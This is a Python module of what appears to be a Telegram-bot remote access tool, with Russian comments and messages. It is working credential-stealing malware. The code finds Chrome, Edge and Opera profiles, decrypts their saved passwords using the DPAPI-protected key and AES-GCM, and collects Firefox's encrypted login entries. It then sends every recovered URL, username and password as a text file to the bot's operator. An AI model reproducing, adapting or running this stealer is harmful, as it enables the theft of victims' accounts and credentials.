##  _________________________________________
##   |_______  authors: Eks1azy     _______|
##    \_\_\_|______  Oqwe4O  _______|\_\_\_\
##    \_\_\_|______  Tusay1  _______|\_\_\_\
##           \_\_\_\_\_\_\_\_\_\_\_\
##   ___________________________________________
##  |                                          /\
##  |  github:https://github.com/Eks1azy      / /
##  |                                        / /
##  |    if you will find some bugs or      / /
##  |                                      / /
##  |    have ideas for improvements,     / /
##  |                                    / /
##  |       please send it to me        / /
##  |__________________________________/ /
##  \_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_/


# forked from https://github.com/cybermads/Letrium.git
# author: cyberman

from aiogram import  types, F
from aiogram.filters import Command
from config import ALLOWED_USER_ID
from Cryptodome.Cipher import AES

import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import tempfile

LOCAL = os.getenv("LOCALAPPDATA")
APPDATA = os.getenv("APPDATA")

PATHS = {
    'Chrome': os.path.join(LOCAL, 'Google', 'Chrome', 'User Data'),
    'Edge': os.path.join(LOCAL, 'Microsoft', 'Edge', 'User Data'),
    'Opera': os.path.join(LOCAL, 'Opera Software', 'Opera Stable'),
    'Firefox': os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles'),
}

def register_password_handler(dp):

    def encrypt_chrome_key(path):
        try:
            with open(os.path.join(path, "Local State"), "r", encoding="utf-8") as f:
                key_b64 = json.load(f)["os_crypt"]["encrypted_key"]
            key = base64.b64decode(key_b64)[5:]
            decrypted_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            print(f"[DEBUG] Ключ для {path} успешно получен.")
            return decrypted_key
        except Exception as e:
            print(f"[ERROR] Не удалось получить ключ из {path}: {e}")
            return None

    def decrypt_chrome_password(buff, key):
        try:
            if buff.startswith(b'v10'):
                iv = buff[3:15]
                payload = buff[15:]
                cipher = AES.new(key, AES.MODE_GCM, iv)
                decrypted = cipher.decrypt(payload)[:-16].decode()
                print(f"[DEBUG] Пароль расшифрован через AES-GCM: {decrypted}")
                return decrypted
            else:
                # Версия пароля без шифрования AES-GCM, старый формат DPAPI
                decrypted = win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode()
                print(f"[DEBUG] Пароль расшифрован через DPAPI (старый формат): {decrypted}")
                return decrypted
        except UnicodeDecodeError as e:
            print(f"[ERROR] Ошибка декодирования пароля: {e}")
            return ""
        except Exception as e:
            print(f"[ERROR] Не удалось расшифровать пароль: {e}")
            return ""


    async def extract_firefox_passwords(profile_path):
        # Оставляем как есть
        logins_path = os.path.join(profile_path, "logins.json")
        if not os.path.exists(logins_path):
            return []
        try:
            with open(logins_path, "r", encoding="utf-8") as f:
                logins_data = json.load(f)
            results = []
            for login in logins_data.get("logins", []):
                results.append({
                    "browser": "Firefox",
                    "profile": os.path.basename(profile_path),
                    "url": login.get("hostname"),
                    "username": login.get("encryptedUsername"),
                    "password": login.get("encryptedPassword"),
                    "note": "Пароли зашифрованы, требуется дополнительное расшифрование."
                })
            return results
        except Exception as e:
            print(f"[ERROR] Ошибка при чтении паролей Firefox: {e}")
            return []

    @dp.message(F.text.lower() == "пароли браузера [new]")
    @dp.message(Command("passwords"))
    async def extract_passwords(message: types.Message):
        if message.from_user.id != ALLOWED_USER_ID:
            await message.answer("К сожалению, у вас нет доступа к этому боту.")
            return

        res = []

        for browser, base_path in PATHS.items():
            if not os.path.exists(base_path):
                print(f"[INFO] Путь не найден для {browser}: {base_path}")
                continue

            if browser == "Firefox":
                for profile in os.listdir(base_path):
                    profile_path = os.path.join(base_path, profile)
                    if not os.path.isdir(profile_path):
                        continue
                    res.extend(await extract_firefox_passwords(profile_path))
                continue

            key = encrypt_chrome_key(base_path)
            if not key:
                print(f"[WARNING] Не удалось получить ключ для {browser}, пропускаем.")
                continue

            profiles = [p for p in os.listdir(base_path) if p == "Default" or p.startswith("Profile")]
            if browser == "Opera":
                profiles = [""]

            for profile in profiles:
                db_path = os.path.join(base_path, profile, "Login Data") if profile else os.path.join(base_path, "Login Data")
                if not os.path.exists(db_path):
                    print(f"[INFO] Файл Login Data не найден: {db_path}")
                    continue

                tmp_db = os.path.join(os.getenv("TEMP"), f"{browser.lower()}_logins_tmp.db")
                try:
                    shutil.copy2(db_path, tmp_db)
                    conn = sqlite3.connect(tmp_db)
                    cur = conn.cursor()
                    cur.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for url, username, pwd_encrypted in cur.fetchall():
                        if not username and not pwd_encrypted:
                            continue

                        # Проверяем, что пароль в байтах
                        if not isinstance(pwd_encrypted, bytes):
                            print(f"[WARNING] password_value не байты, а {type(pwd_encrypted)}")
                            pwd_encrypted = bytes(pwd_encrypted)

                        password = decrypt_chrome_password(pwd_encrypted, key)
                        res.append({
                            "browser": browser,
                            "profile": profile if profile else "Default",
                            "url": url,
                            "username": username,
                            "password": password
                        })
                    cur.close()
                    conn.close()
                except Exception as e:
                    print(f"[ERROR] Ошибка при чтении базы {db_path}: {e}")
                finally:
                    if os.path.exists(tmp_db):
                        os.remove(tmp_db)

        if not res:
            await message.answer("Ничего не найдено.")
            return

        text_lines = []
        for item in res:
            if item.get("browser") == "Firefox":
                line = (f"[{item['browser']}] ({item['profile']}) URL: {item['url']}\n"
                        f"Username (encrypted): {item['username']}\n"
                        f"Password (encrypted): {item['password']}\n"
                        f"Note: {item.get('note', '')}\n")
            else:
                line = (f"[{item['browser']}] ({item['profile']}) URL: {item['url']}\n"
                        f"Username: {item['username']}\n"
                        f"Password: {item['password']}\n")
            text_lines.append(line)

        full_text = "\n".join(text_lines)

        tmp_file_path = None
        try:
            with tempfile.NamedTemporaryFile("w+", encoding="utf-8", delete=False, suffix=".txt") as tmp_file:
                tmp_file.write(full_text)
                tmp_file_path = tmp_file.name

            await message.answer_document(types.FSInputFile(tmp_file_path, filename="browser_passwords.txt"))
        finally:
            if tmp_file_path and os.path.exists(tmp_file_path):
                os.remove(tmp_file_path)